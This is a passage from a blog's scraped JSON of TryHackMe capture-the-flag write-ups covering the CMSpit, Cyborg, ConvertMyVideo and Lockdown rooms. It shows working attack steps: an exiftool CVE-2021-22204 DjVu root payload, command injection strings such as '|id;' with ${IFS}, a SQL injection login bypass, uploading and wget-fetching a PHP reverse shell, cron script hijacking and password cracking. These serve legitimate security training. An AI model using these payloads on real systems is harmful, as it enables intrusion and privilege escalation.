10.10.103.36 [*] Meterpreter session 1 opened (10.17.6.87:4444 -\u0026gt; 10.10.103.36:38906) at 2021-12-25 08:22:49 -0500 meterpreter \u0026gt; shell Process 916 created. Channel 0 created. id uid=33(www-data) gid=33(www-data) groups=33(www-data) There are 2 users on the machine stux \u0026amp; root\nwww-data@ubuntu:/var/www/html/cockpit/assets/app/js$ cat /etc/passwd | grep \u0026#34;bash\u0026#34; root‚ùå0:0:root:/root:/bin/bash stux‚ùå1000:1000:Coock,,,:/home/stux:/bin/bash webflag üö© Grab the web flag which is in the home dir of www-data\nwww-data@ubuntu:/var/www/html/cockpit$ cat webflag.php \u0026lt;?php $flag = \u0026#34;thm{f158bea7*************55626d78e9fb}\u0026#34;; ?\u0026gt; Shell as Stux Time to escalate ! I quickly transferred linpeas to the target machine \u0026amp; ran it.\nMongoDB Seems that MongoDB is running internally.We can confirm that by netstat command\nwww-data@ubuntu:/var/www/html/cockpit$ netstat -tulpn (Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.) Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:27017 0.0.0.0:* LISTEN - tcp6 0 0 :::80 :::* LISTEN - tcp6 0 0 :::22 :::* LISTEN - udp 0 0 0.0.0.0:68 0.0.0.0:* MongoDB runs on port 27017 by default\nWe use MongoDB cli to retreive password for stux stored in it\nIf you are not familiar with MongoDB commands, refer this - https://docs.mongodb.com/manual/reference/mongo-shell/\nstux@ubuntu:~$ mongo MongoDB shell version: 2.6.10 connecting to: test \u0026gt; show dbs admin (empty) local 0.078GB sudousersbak 0.078GB \u0026gt; use sudousersbak switched to db sudousersbak \u0026gt; show collections flag system.indexes user \u0026gt; db.user.find() { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;60a89d0caadffb0ea68915f9\u0026#34;), \u0026#34;name\u0026#34; : \u0026#34;p******23\u0026#34; } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;60a89dfbaadffb0ea68915fa\u0026#34;), \u0026#34;name\u0026#34; : \u0026#34;stux\u0026#34; } user.txt üö© Now since we have the password for user stux ,let\u0026rsquo;s SSH in to machine as STUX \u0026amp; grab the user.txt !\nsh3bu@VM:~/thm/cmspit$ ssh stux@cmspit.thm stux@cmspit.thm\u0026#39;s password: Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-210-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage Last login: Sat May 22 19:41:38 2021 from 192.168.85.1 stux@ubuntu:~$ id uid=1000(stux) gid=1000(stux) groups=1000(stux),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare) stux@ubuntu:~$ cat user.txt thm{c5fc72c4**********a05f0ce} Shell as root Running sudo -l revealed that we could run exiftool as root.\nWe could refer GTFOBINS for sudo entry on exiftool binary to escalate our privileges to root !\nExiftool CVE But for the sake of this room, we use a vulnerability on exiftool to escalate our privileges to root. Googling for exiftool cve show us this - CVE-2021-22204\nYou could read more about this CVE here -https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/\nLink to exploit on github - https://github.com/convisoappsec/CVE-2021-22204-exiftool\nSteps to escalate -\n1. Create a file named payload with contents - (metadata \u0026#34;\\c${system(\u0026#39;/bin/bash -p\u0026#39;)};\u0026#34;) 2. bzz payload payload.bzz 3. djvumake exploit.djvu INFO=\u0026#39;1,1\u0026#39; BGjp=/dev/null ANTz=payload.bzz 4. sudo exiftool exploit.djvu root.txt üö© Now we get have a root shell ! Grab root.txt\nroot@ubuntu:~# whoami root root@ubuntu:~# cat /root/root.txt thm{bf52a85b**********0d4d5ada} ","permalink":"https://sh3bu.github.io/themes/hugo-PaperMod/posts/cmspit/","summary":"Description This is a machine that allows you to practise web app hacking and privilege escalation using recent vulnerabilities. You\u0026rsquo;ve identified that the CMS installed on the web server has several vulnerabilities that allow attackers to enumerate users and change account passwords.\nYour mission is to exploit these vulnerabilities and compromise the web server.\nRoom name CMSpit OS Linux Difficulty Medium Room Link https://tryhackme.com/room/cmspit Creator stuxnet Recon Portscan sh3bu@VM:~/thm/cmspit$ rustscan -a cmspit.","title":"CMSpit - THM"},{"content":"Description A box involving encrypted archives, source code analysis and more.\nRoom name Cyborg OS Linux Difficulty Easy Room Link https://tryhackme.com/room/cyborgt8 Creator fieldraccoon Enumeration Portscan ‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/Cyborg] ‚îî‚îÄ# rustscan -a cyborg.thm -- -sV -sC -oN cyborg.nmap # Nmap 7.92 scan initiated Sat Jan 22 10:09:17 2022 as: nmap -vvv -p 22,80 -sV -sC -oN cyborg.nmap 10.10.194.216 Nmap scan report for cyborg.thm (10.10.194.216) Host is up, received echo-reply ttl 63 (0.25s latency). Scanned at 2022-01-22 10:09:19 EST for 15s PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCtLmojJ45opVBHg89gyhjnTTwgEf8lVKKbUfVwmfqYP9gU3fWZD05rB/4p/qSoPbsGWvDUlSTUYMDcxNqaADH/nk58URDIiFMEM6dTiMa0grcKC5u4NRxOCtZGHTrZfiYLQKQkBsbmjbb5qpcuhYo/tzhVXsrr592Uph4iiUx8zhgfYhqgtehMG+UhzQRjnOBQ6GZmI4NyLQtHq7jSeu7ykqS9KEdkgwbBlGnDrC7ke1I9352lBb7jlsL/amXt2uiRrBgsmz2AuF+ylGha97t6JkueMYHih4Pgn4X0WnwrcUOrY7q9bxB1jQx6laHrExPbz+7/Na9huvDkLFkr5Soh | 256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBB5OB3VYSlOPJbOwXHV/je/alwaaJ8qljr3iLnKKGkwC4+PtH7IhMCAC3vim719GDimVEEGdQPbxUF6eH2QZb20= | 256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKlr5id6IfMeWb2ZC+LelPmOMm9S8ugHG2TtZ5HpFuZQ 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Jan 22 10:09:34 2022 -- 1 IP address (1 host up) scanned in 17.23 seconds Website It gives us the default apache page and nothing else.\nLets do some directory-bruteforcing .\n‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/Cyborg] ‚îî‚îÄ# dirsearch -u cyborg.thm -w /usr/share/wordlists/dirb/common.txt _|. _ _ _ _ _ _|_ v0.4.1 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 4613 Output File: /root/.dirsearch/reports/cyborg.thm/_22-01-22_10-18-59.txt Error Log: /root/.dirsearch/logs/errors-22-01-22_10-18-59.log Target: http://cyborg.thm/ [10:19:00] Starting: [10:19:06] 301 - 308B - /admin -\u0026gt; http://cyborg.thm/admin/ [10:19:23] 301 - 306B - /etc -\u0026gt; http://cyborg.thm/etc/ [10:19:29] 200 - 11KB - /index.html [10:19:47] 403 - 275B - /server-status Task Completed /admin There is a possible username called Alex in setup description.\nClicking on admin tab leads us to /admin/admin.html\nSeems like a chat between Josh, Adam and Alex where he mentions about some kind of music_archive.\nThe archive tab gives us two more options listen and download\nClicking on download button downloads an archive.tar file.\n/etc The passwd file contains a hash\nThe squid.conf file contains the squid proxy configuration.\nShell as Alex Lets untar the tar archive and examine it.\n‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/Cyborg] ‚îî‚îÄ# tar -xvf archive.tar home/field/dev/final_archive/ home/field/dev/final_archive/hints.5 home/field/dev/final_archive/integrity.5 home/field/dev/final_archive/config home/field/dev/final_archive/README home/field/dev/final_archive/nonce home/field/dev/final_archive/index.5 home/field/dev/final_archive/data/ home/field/dev/final_archive/data/0/ home/field/dev/final_archive/data/0/5 home/field/dev/final_archive/data/0/3 home/field/dev/final_archive/data/0/4 home/field/dev/final_archive/data/0/1 ‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/Cyborg] ‚îî‚îÄ# cd home/field/dev/final_archive/ ‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/‚Ä¶/home/field/dev/final_archive] ‚îî‚îÄ# ls config data hints.5 index.5 integrity.5 nonce README So it contains 7 files .Lets check out the README file first.\nborg archive ‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/‚Ä¶/home/field/dev/final_archive] ‚îî‚îÄ# cat README This is a Borg Backup repository. See https://borgbackup.readthedocs.io/ So it tells us this is a borg archive repository \u0026amp; also provides a link to its documentation website.\nHere you can read how to extract contents from the borg archive - https://borgbackup.readthedocs.io/en/stable/usage/extract.html\n‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/Cyborg] ‚îî‚îÄ# borg extract home/field/dev/final_archive::music_archive Enter passphrase for key /root/Cyborg/home/field/dev/final_archive: It asks us for a passphrase. Remember we got a hash from the website earlier ! Let crack it using john.\njtr ‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/Cyborg] ‚îî‚îÄ# john hash --wordlist=/usr/share/wordlists/rockyou.txt 130 ‚®Ø Created directory: /root/.john Warning: detected hash type \u0026#34;md5crypt\u0026#34;, but the string is also recognized as \u0026#34;md5crypt-long\u0026#34; Use the \u0026#34;--format=md5crypt-long\u0026#34; option to force loading these as that type instead Using default input encoding: UTF-8 Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 SSE2 4x3]) Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status squ****rd (?) 1g 0:00:00:00 DONE (2022-01-22 10:50) 1.052g/s 41027p/s 41027c/s 41027C/s wonderfull..samantha5 Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. Now since we have the password lets extract the contents of the borg archive.\nWe get a folder called alex. Lets see what\u0026rsquo;s in here\n‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/Cyborg/home] ‚îî‚îÄ# tree alex 127 ‚®Ø alex ‚îú‚îÄ‚îÄ Desktop ‚îÇ ‚îî‚îÄ‚îÄ secret.txt ‚îú‚îÄ‚îÄ Documents ‚îÇ ‚îî‚îÄ‚îÄ note.txt ‚îú‚îÄ‚îÄ Downloads ‚îú‚îÄ‚îÄ Music ‚îú‚îÄ‚îÄ Pictures ‚îú‚îÄ‚îÄ Public ‚îú‚îÄ‚îÄ Templates ‚îî‚îÄ‚îÄ Videos 8 directories, 2 files secret.txt wasn\u0026rsquo;t useful but note.txt had SSH creds for the user Alex\n‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/Cyborg/home] ‚îî‚îÄ# cat alex/Desktop/secret.txt shoutout to all the people who have gotten to this stage whoop whoop!\u0026#34; ‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/Cyborg/home] ‚îî‚îÄ# cat alex/Documents/note.txt Wow I\u0026#39;m awful at remembering Passwords so I\u0026#39;ve taken my Friends advice and noting them down! alex:S3********3 user.txt üö© Lets ssh in as alex \u0026amp; grab the user.txt flag !\n‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/Cyborg/home] ‚îî‚îÄ# ssh alex@cyborg.thm 130 ‚®Ø alex@cyborg.thm\u0026#39;s password: Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.15.0-128-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage 27 packages can be updated. 0 updates are security updates. The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. alex@ubuntu:~$ whoami alex alex@ubuntu:~$ id uid=1000(alex) gid=1000(alex) groups=1000(alex),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare) alex@ubuntu:~$ cat user.txt flag{1_hop3*******************saf3} Shell as root Running sudo -l reveals that we could run backup.sh as root\nalex@ubuntu:~$ sudo -l Matching Defaults entries for alex on ubuntu: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User alex may run the following commands on ubuntu: (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh backup.sh alex@ubuntu:~$ cat /etc/mp3backups/backup.sh #!/bin/bash sudo find / -name \u0026#34;*.mp3\u0026#34; | sudo tee /etc/mp3backups/backed_up_files.txt input=\u0026#34;/etc/mp3backups/backed_up_files.txt\u0026#34; #while IFS= read -r line #do #a=\u0026#34;/etc/mp3backups/backed_up_files.txt\u0026#34; # b=$(basename $input) #echo # echo \u0026#34;$line\u0026#34; #done \u0026lt; \u0026#34;$input\u0026#34; while getopts c: flag do case \u0026#34;${flag}\u0026#34; in c) command=${OPTARG};; esac done backup_files=\u0026#34;/home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3\u0026#34; # Where to backup to. dest=\u0026#34;/etc/mp3backups/\u0026#34; # Create archive filename. hostname=$(hostname -s) archive_file=\u0026#34;$hostname-scheduled.tgz\u0026#34; # Print start status message. echo \u0026#34;Backing up $backup_files to $dest/$archive_file\u0026#34; echo # Backup the files using tar. tar czf $dest/$archive_file $backup_files # Print end status message. echo echo \u0026#34;Backup finished\u0026#34; cmd=$($command) echo $cmd From the above code , we could understand that it backups all the music files but this particular lines stand out\ngetopts while getopts c: flag do case \u0026#34;${flag}\u0026#34; in c) command=${OPTARG};; esac done Here it asks for a input flag -c using getopts and executes the i/p command given to -c at the end of the script\ncmd=$($command) echo $cmd getopts is a very convenient bash script utility, which helps you to conveniently handle the passing of flags\nLet try giving id command as i/p in -c flag\nalex@ubuntu:~$ sudo /etc/mp3backups/backup.sh -c id [redacted] Backup finished uid=0(root) gid=0(root) groups=0(root) It works !!\nroot.txt üö© Lets now retreive root.txt flag\nalex@ubuntu:~$ sudo /etc/mp3backups/backup.sh -c \u0026#34;cat /root/root.txt\u0026#34; [redacted] Backup finished flag{Than5s****************enJ053d} ","permalink":"https://sh3bu.github.io/themes/hugo-PaperMod/posts/cyborg/","summary":"Description A box involving encrypted archives, source code analysis and more.\nRoom name Cyborg OS Linux Difficulty Easy Room Link https://tryhackme.com/room/cyborgt8 Creator fieldraccoon Enumeration Portscan ‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/Cyborg] ‚îî‚îÄ# rustscan -a cyborg.thm -- -sV -sC -oN cyborg.nmap # Nmap 7.92 scan initiated Sat Jan 22 10:09:17 2022 as: nmap -vvv -p 22,80 -sV -sC -oN cyborg.nmap 10.10.194.216 Nmap scan report for cyborg.thm (10.10.194.216) Host is up, received echo-reply ttl 63 (0.25s latency). Scanned at 2022-01-22 10:09:19 EST for 15s PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 7.","title":"Cyborg - THM"},{"content":"My Script to convert videos to MP3 is super secure. You can convert your videos - Why don\u0026rsquo;t you check it out!\nRoom name Convert My Video OS Linux Difficulty Medium Room Link https://tryhackme.com/room/convertmyvideo Creator overjt Enumeration Portscan ‚ûú yt-convert nmap -sC -sV 10.10.240.17 -v -oN yt-convert.nmap # Nmap 7.91 scan initiated Sat Nov 27 06:13:41 2021 as: nmap -sC -sV -v -oN yt-convert.nmap 10.10.240.17 Increasing send delay for 10.10.240.17 from 5 to 10 due to 11 out of 30 dropped probes since last increase. Nmap scan report for 10.10.240.17 Host is up (0.27s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 65:1b:fc:74:10:39:df:dd:d0:2d:f0:53:1c:eb:6d:ec (RSA) | 256 c4:28:04:a5:c3:b9:6a:95:5a:4d:7a:6e:46:e2:14:db (ECDSA) |_ 256 ba:07:bbüíø42:4a:f2:93:d1:05:d0:b3:4c:b1:d9:b1 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html; charset=UTF-8). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Nov 27 06:14:29 2021 -- 1 IP address (1 host up) scanned in 47.53 seconds As you can see there are only 2 ports open\nPort 22 - SSH Port 80 - HTTP - Apache 2.4.29 Website - Port 80 The website at port 80 shows us a simple page like this\nIt asks us for an ID to which it converts it into an video.\nGobuster ‚ûú yt-convert gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://convertmyvideo.thm/ /admin (Status: 401) /images (Status: 301) /index.php (Status: 200) /index.php (Status: 200) /js (Status: 301) /server-status (Status: 403) /tmp (Status: 301) QN 1- ‚ùì What is the name of the secret folder? - admin So the only interesting find here is the /admin directory.Lets check it out.\nI tried some default creds but it didn\u0026rsquo;t work. So lets access this once we get some valid creds.\nBurpsuite Lets get back to the webpage at port 80 and intercept the request to see what\u0026rsquo;s happening.\nI entered a random number as ID \u0026amp; pressed Convert. The request looked like this\nSo the only parameter here that we can play with is yt_url.\nyoutube-dl I tried entering id to see how the application responds .\nError -\n{\u0026#34;status\u0026#34;:127,\u0026#34;errors\u0026#34;:\u0026#34;WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this.\\nERROR: u\u0026#39;id\u0026#39; is not a valid URL. Set --default-search \\\u0026#34;ytsearch\\\u0026#34; (or run youtube-dl \\\u0026#34;ytsearch:id\\\u0026#34; ) to search YouTube\\nsh: 1: -f: not found\\n\u0026#34;,\u0026#34;url_orginal\u0026#34;:\u0026#34;id\u0026#34;,\u0026#34;output\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;result_url\u0026#34;:\u0026#34;\\/tmp\\/downloads\\/61a215d9e9a4a.mp3\u0026#34;} So it is running something called youtube-dl. Lets google and see what actually this is.\nSeems like it is a command line tool to download or convert youtube videos!\nIt is run with the following syntax - youtube-dl [OPTIONS] URL [URL...]\nAssuming there is a command injection vulnerability , I gave this i/p in the yt_url parameter - |id;\nNOTE-\n| - will act as command separator ; - acts as a line terminator ie ensures nothing executes after this . Now the error response was like this -\n{\u0026#34;status\u0026#34;:127,\u0026#34;errors\u0026#34;:\u0026#34;WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this.\\nUsage: youtube-dl [OPTIONS] URL [URL...]\\n\\nyoutube-dl: error: You must provide at least one URL.\\nType youtube-dl --help to see a list of all options.\\nsh: 1: -f: not found\\n\u0026#34;,\u0026#34;url_orginal\u0026#34;:\u0026#34;|id;\u0026#34;,\u0026#34;output\u0026#34;:\u0026#34;uid=33(www-data) gid=33(www-data) groups=33(www-data)\\n\u0026#34;,\u0026#34;result_url\u0026#34;:\u0026#34;\\/tmp\\/downloads\\/61a21a622915c.mp3\u0026#34;} Note that it returned the result of our id command which is uid=33(www-data) gid=33(www-data) groups=33(www-data)\nSo now since we could execute commands , lets look at what directory we are in !\nResponse -\n{\u0026#34;status\u0026#34;:127,\u0026#34;errors\u0026#34;:\u0026#34;WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this.\\nUsage: youtube-dl [OPTIONS] URL [URL...]\\n\\nyoutube-dl: error: You must provide at least one URL.\\nType youtube-dl --help to see a list of all options.\\nsh: 1: -f: not found\\n\u0026#34;,\u0026#34;url_orginal\u0026#34;:\u0026#34;|pwd;\u0026#34;,\u0026#34;output\u0026#34;:\u0026#34;\\/var\\/www\\/html\\n\u0026#34;,\u0026#34;result_url\u0026#34;:\u0026#34;\\/tmp\\/downloads\\/61a21be02e591.mp3\u0026#34;} So we are in the /var/www/html directory .\nLets check out the contents of the directory\nResponse -\nSyntax error: EOF in backquote substitution Seems like the space is causing errors.After some googling I found that we could use ${IFS} which acts as a whitespace !\nResponse was bit confusing so I have formatted it to make it easy to understand -\ntotal 36 drwxr-xr-x 6 www-data www-data 4096 Apr 12 2020 . drwxr-xr-x 3 root root 4096 Apr 12 2020 .. -rw-r--r-- 1 www-data www-data 152 Apr 12 2020 .htaccess drwxr-xr-x 2 www-data www-data 4096 Apr 12 2020 admin drwxrwxr-x 2 www-data www-data 4096 Apr 12 2020 images -rw-r--r-- 1 www-data www-data 1790 Apr 12 2020 index.php drwxrwxr-x 2 www-data www-data 4096 Apr 12 2020 js -rw-rw-r-- 1 www-data www-data 205 Apr 12 2020 style.css drwxr-xr-x 2 www-data www-data 4096 Apr 12 2020 tmp user.txt üö© The admin directory seems looks interesting.Lets list the contents of it.\ntotal 24 drwxr-xr-x 2 www-data www-data 4096 Apr 12 2020 . drwxr-xr-x 6 www-data www-data 4096 Apr 12 2020 .. -rw-r--r-- 1 www-data www-data 98 Apr 12 2020 .htaccess -rw-r--r-- 1 www-data www-data 49 Apr 12 2020 .htpasswd -rw-r--r-- 1 www-data www-data 39 Apr 12 2020 flag.txt -rw-rw-r-- 1 www-data www-data 202 Apr 12 2020 index.php Wohoo!There\u0026rsquo;s the first flag .Lets grab the flag and submit it\nQN 3- ‚ùì What is the user flag? - flag{0d8486a*********7f4046ed7} Shell as www-data Its frustrating to use this method to execute commands so lets try getting a shell !\n#center\nI used wget to transfer my payload which pentestmonkey's php reverse shell to the victim.\nThen set up a listerner \u0026amp; execute php shell.php to get a reverse shell back .\nWe are in as www-data.\nLets check what users are on this machine\nwww-data@dmv:/var/www/html/admin$ cat /etc/passwd | grep \u0026#34;home\u0026#34; cat /etc/passwd | grep \u0026#34;home\u0026#34; syslog‚ùå102:106::/home/syslog:/usr/sbin/nologin dmv‚ùå1000:1000:dmv:/home/dmv:/bin/bash There is only one user other than root which is dmv\nRemember? We saw few interesting directories like .htpasswd .It contained the following hash\nitsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/ Jtr We crack the password using jtr\n‚ûú yt-convert john --wordlist=/usr/share/wordlists/rockyou.txt hash Warning: detected hash type \u0026#34;md5crypt\u0026#34;, but the string is also recognized as \u0026#34;md5crypt-long\u0026#34; Use the \u0026#34;--format=md5crypt-long\u0026#34; option to force loading these as that type instead Using default input encoding: UTF-8 Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 SSE2 4x3]) Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status j**ie (?) 1g 0:00:00:00 DONE (2021-11-27 07:32) 3.448g/s 993.1p/s 993.1c/s 993.1C/s alyssa..brenda Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Maybe this is the creds to login through the /admin directory which required creds.Anyways no need to check whats in there since we already have a reverse shell.\nQN 2- ‚ùì What is the user to access the secret folder? - itsmeadmin Shell as root After some enumeration , I found a wierd script called clean.sh in /var/www/html/tmp/. It contained the following lines -\nwww-data@dmv:/var/www/html/tmp$ cat clean.sh cat clean.sh rm -rf downloads pspy So my guess is that it is being run by cron in the background once in few mins.Lets conform that using pspy\nclean.sh script is indeed run by cron once in 2 mins.\nroot.txt üö© So I added the following to the clean.sh script to retrieve the root flag !\nwww-data@dmv:/var/www/html/tmp$ echo \u0026#34;cat /root/root.txt \u0026gt; /home/flag.txt\u0026#34; \u0026gt;\u0026gt;clean.sh www-data@dmv:/var/www/html/tmp$ cat clean.sh cat clean.sh rm -rf downloads cat /root/root.txt \u0026gt; /home/flag.txt After few mins, we have a file called flag.txt in /home directory which contains the flag.\nQN 4- ‚ùì What is the root flag? - flag{d9b36*********399c5e94a} ","permalink":"https://sh3bu.github.io/themes/hugo-PaperMod/posts/convertmyvideo/","summary":"My Script to convert videos to MP3 is super secure. You can convert your videos - Why don\u0026rsquo;t you check it out!\nRoom name Convert My Video OS Linux Difficulty Medium Room Link https://tryhackme.com/room/convertmyvideo Creator overjt Enumeration Portscan ‚ûú yt-convert nmap -sC -sV 10.10.240.17 -v -oN yt-convert.nmap # Nmap 7.91 scan initiated Sat Nov 27 06:13:41 2021 as: nmap -sC -sV -v -oN yt-convert.nmap 10.10.240.17 Increasing send delay for 10.10.240.17 from 5 to 10 due to 11 out of 30 dropped probes since last increase.","title":"ConvertMyVideo - THM"},{"content":"Description Stay at 127.0.0.1. Wear a 255.255.255.0\nRoom name Lockdown OS Linux Difficulty Medium Room Link https://tryhackme.com/room/lockdown Creator hangrymoose Enumeration Portscan ‚ûú lockdown nmap -sC -sV 10.10.252.58 -v -oN lockdown.nmap # Nmap 7.91 scan initiated Mon Nov 8 03:56:11 2021 as: nmap -sV -sC -v -oN lockdown.nmap 10.10.252.58 Nmap scan report for 10.10.252.58 Host is up (0.35s latency). Not shown: 998 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 27:1d:c5:8a:0b:bc:02:c0:f0:f1:f5:5a:d1:ff:a4:63 (RSA) | 256 ce:f7:60:29:52:4f:65:b1:20:02:0a:2d:07:40:fd:bf (ECDSA) |_ 256 a5:b5:5a:40:13:b0:0f:b6:5a:5f:21:60:71:6f:45:2e (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Coronavirus Contact Tracer Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Nov 8 03:56:56 2021 -- 1 IP address (1 host up) scanned in 45.47 seconds Website - Port 80 Add contacttracer.thm to your /etc/hosts file.\nVisiting website at port 80 gives us this simple page of Coronavirus contact tracer.\nThe link to admin panel which lead to /login.php had a login form .\nlogin.php\nsqli auth-bypass I tried simple sqli auth bypass payload like admin' OR 1=1-- and to my surprise I was logged in !\nShell as www-data Browsing through the application I finally reached the settings page which had an upload image functionality .\nI was not sure whether .php file could be uploaded .If not then I would have to rename it to something like shell.php.jpg .\nI first tried uploading php-reverse-shell.php script \u0026amp; it was succesfully uploaded.\nNow I went back to contacttracer.thm and opened the image in new tab .Make sure to setup nc listener before this.\nThe page keeps on loading which is a good sign that means the reverse shell connected back to our nc listener!\nSo now we are in as www-data .\nShell as cyrus There are 3 users on this machine root,cyrus \u0026amp; maxine\nwww-data@lockdown:/$ cat /etc/passwd | grep bash cat /etc/passwd | grep bash root‚ùå0:0:root:/root:/bin/bash maxine‚ùå1000:1000:maxine:/home/maxine:/bin/bash cyrus‚ùå1001:1001::/home/cyrus:/bin/bash The /var/www/html directory contained config.php file which had a password hash.\nwww-data@lockdown:/var/www/html$ cat config.php cat config.php \u0026lt;?php session_start(); $dev_data = array(\u0026#39;id\u0026#39;=\u0026gt;\u0026#39;-1\u0026#39;,\u0026#39;firstname\u0026#39;=\u0026gt;\u0026#39;Developer\u0026#39;,\u0026#39;lastname\u0026#39;=\u0026gt;\u0026#39;\u0026#39;,\u0026#39;username\u0026#39;=\u0026gt;\u0026#39;dev_oretnom\u0026#39;,\u0026#39;password\u0026#39;=\u0026gt;\u0026#39;5da283a2***********df5bc0d0\u0026#39;,\u0026#39;last_login\u0026#39;=\u0026gt;\u0026#39;\u0026#39;,\u0026#39;date_updated\u0026#39;=\u0026gt;\u0026#39;\u0026#39;,\u0026#39;date_added\u0026#39;=\u0026gt;\u0026#39;\u0026#39;); if(!defined(\u0026#39;base_url\u0026#39;)) define(\u0026#39;base_url\u0026#39;,\u0026#39;http://contacttracer.thm/\u0026#39;); if(!defined(\u0026#39;base_app\u0026#39;)) define(\u0026#39;base_app\u0026#39;, str_replace(\u0026#39;\\\\\u0026#39;,\u0026#39;/\u0026#39;,__DIR__).\u0026#39;/\u0026#39; ); if(!defined(\u0026#39;dev_data\u0026#39;)) define(\u0026#39;dev_data\u0026#39;,$dev_data); require_once(\u0026#39;classes/DBConnection.php\u0026#39;); require_once(\u0026#39;classes/SystemSettings.php\u0026#39;); $db = new DBConnection; $conn = $db-\u0026gt;conn; function redirect($url=\u0026#39;\u0026#39;){ if(!empty($url)) echo \u0026#39;\u0026lt;script\u0026gt;location.href=\u0026#34;\u0026#39;.base_url .$url.\u0026#39;\u0026#34;\u0026lt;/script\u0026gt;\u0026#39;; } function validate_image($file){ if(!empty($file)){ 